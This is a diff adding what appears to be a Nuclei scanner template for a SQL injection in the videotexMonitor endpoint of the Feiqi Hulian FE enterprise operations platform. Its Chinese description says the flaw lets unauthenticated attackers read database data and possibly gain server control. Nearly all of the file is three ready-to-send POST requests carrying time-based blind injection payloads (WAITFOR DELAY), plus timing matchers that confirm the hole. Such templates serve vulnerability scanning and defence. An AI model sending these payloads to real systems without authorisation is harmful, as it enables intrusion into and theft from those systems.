@@ -1,0 +1,43 @@
+id: FE-videotexMonitor-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 飞企互联-FE企业运营管理平台 videotexMonitor接口存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/F1-6%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-FE%E4%BC%81%E4%B8%9A%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-SQL?id=f1-6%e9%a3%9e%e4%bc%81%e4%ba%92%e8%81%94-fe%e4%bc%81%e4%b8%9a%e8%bf%90%e8%90%a5%e7%ae%a1%e7%90%86%e5%b9%b3%e5%8f%b0-sql
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /cooperate/videotexMonitor.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 59
+
+        master_key=1&flowcode=1';WAITFOR+DELAY '0:0:3'--&dialogid=1
+      - |-
+        POST /cooperate/videotexMonitor.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 59
+
+        master_key=1&flowcode=1';WAITFOR+DELAY '0:0:6'--&dialogid=1
+      - |-
+        POST /cooperate/videotexMonitor.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 59
+
+        master_key=1&flowcode=1';WAITFOR+DELAY '0:0:9'--&dialogid=1
+        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
